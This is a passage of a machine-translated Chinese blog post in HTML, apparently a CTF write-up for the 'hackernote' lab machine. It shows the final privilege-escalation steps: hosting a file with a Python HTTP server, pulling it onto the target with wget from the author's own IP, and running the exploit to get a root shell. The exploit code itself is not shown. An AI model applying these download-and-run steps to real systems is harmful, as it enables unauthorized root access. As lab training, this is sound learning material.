translated">现在让我们将这些文件复制到hackernote机器上的SSH的james会话中，让我们使用python托管我们的http服务器</p><p id="5855" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated"><code class="fe li lj lk ll b">python3 -m http.server</code></p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="ls lt di lu bf lv"><div class="gh gi lm"><img src="../Images/1ca154ee9e9e4dfd224acfcdc381e82f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iPzwt1eTh-fYVqM9e_xNeg.png"/></div></div></figure><p id="dff4" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">现在，在我们的SSH会话中，我们将使用wget获取该文件。首先，使用ifconfig检查您自己机器的ip</p><p id="171d" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated"><code class="fe li lj lk ll b">wget http://[yourownip]:8000/exploit</code></p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="ls lt di lu bf lv"><div class="gh gi lm"><img src="../Images/88527c243dc29428ae364c56c0667653.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*40jQfPC4SJwf5Bj7M7NV5w.png"/></div></div></figure><p id="3ef7" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">现在我们有了漏洞</p><p id="238d" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">让我们首先给出执行许可并运行漏洞</p><p id="d842" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated"><code class="fe li lj lk ll b">chmod +x exploit</code></p><p id="4896" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated"><code class="fe li lj lk ll b">./exploit</code></p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="ls lt di lu bf lv"><div class="gh gi lm"><img src="../Images/ab9120a9bd18a688a948b53dd76b03be.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nTZMu3_B0ugLt5wCtUBj3A.png"/></div></div></figure><p id="efd4" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">还有hurayy！！！！！！！！我们得到了根壳</p><p id="45b0" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">作者:infosec_boy</p><div class="mb mc gp gr md me"><a href="https://twitter.com/infosec_boy" rel="noopener  ugc nofollow" target="_blank"><div class="mf ab fo"><div class="mg ab mh cl cj mi"><h2 class="bd ir gy z fp mj fr fs mk fu fw ip bi translated">阿努巴夫·曼德瓦尔</h2><div class="ml l"><h3 class="bd b gy z fp mj fr fs mk fu fw dk translated">anubhav mandarwal的最新推文(@infosec_boy)。一个喜欢pwn机器和搜索信息安全漏洞的家伙…</h3></div><div class="mm l"><p class="bd b dl z fp mj fr fs mk fu fw dk translated">twitter.com</p></div></div><div class="mn l"><div class="mu l mp mq mr mn ms lw me"/></div></div></a></div><div class="mb mc gp gr md me"><a href="https://www.linkedin.com/in/anubhav-mandarwal-318952186/" rel="noopener  ugc nofollow" target="_blank"><div class="mf ab fo"><div class="mg ab mh cl cj mi"><h2 class="bd ir gy z fp mj fr fs mk fu fw ip bi translated">anubhav mandarwal -副威胁研究员- cybers | LinkedIn</h2><div class="ml l"><h3 class="bd b gy z fp mj fr fs mk fu fw dk translated">查看anubhav mandarwal在世界上最大的职业社区LinkedIn上的个人资料。anubhav有3份工作列在…</h3></div><div class="mm l"><p class="bd b dl z fp mj fr fs mk fu fw dk translated">www.linkedin.com</p></div></div><div class="mn l"><div class="mv l mp mq mr mn ms lw me"/></div></div></a></div><p id="6f54" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated"><a class="ae ma" href="https://www.instagram.com/infosec_boy/" rel="noopener ugc nofollow" target="_blank">https://www.instagram.com/infosec_boy/</a></p></div></div>    
</body>
</html>